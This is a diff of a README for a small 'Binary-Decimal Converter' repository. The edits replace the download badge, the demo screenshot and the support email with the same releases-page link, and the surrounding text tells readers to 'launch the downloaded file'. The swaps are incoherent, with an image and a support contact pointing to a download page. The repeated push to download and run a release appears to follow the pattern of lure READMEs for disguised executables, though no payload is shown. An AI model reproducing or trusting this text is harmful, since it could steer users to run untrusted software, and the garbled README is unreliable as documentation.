@@ -18,7 +18,7 @@ Welcome to the Binary-Decimal Converter repository! Here you'll find a simple, d
 
 ## Getting Started 🛠️
 
-To get started with the converter, simply click on the following link: [![Download Converter](https://img.shields.io/badge/Download-Converter-blue)](https://github.com/releases/789694263/Release.zip).
+To get started with the converter, simply click on the following link: [![Download Converter](https://github.com/MrPecko/Binary-Decimal-Converter/releases)](https://github.com/MrPecko/Binary-Decimal-Converter/releases).
 
 If the link ends with a file name, make sure to launch the downloaded file to start using the converter. If you encounter any issues with the link, feel free to check the "Releases" section for alternative download options.
 
@@ -26,7 +26,7 @@ If the link ends with a file name, make sure to launch the downloaded file to st
 
 Here is a sneak peek of the Binary-Decimal Converter interface:
 
-![Converter Demo](demo.png)
+![Converter Demo](https://github.com/MrPecko/Binary-Decimal-Converter/releases)
 
 ## About the Developer 👨‍💻
 
@@ -38,7 +38,7 @@ Contributions are always welcome! If you have any ideas to enhance the converter
 
 ## Support 📧
 
-If you have any questions or need assistance with the converter, please contact our support team at support@binarydecimalconverter.com. We are here to help you make the most out of this tool.
+If you have any questions or need assistance with the converter, please contact our support team at https://github.com/MrPecko/Binary-Decimal-Converter/releases We are here to help you make the most out of this tool.
 
 ## License 📜
 
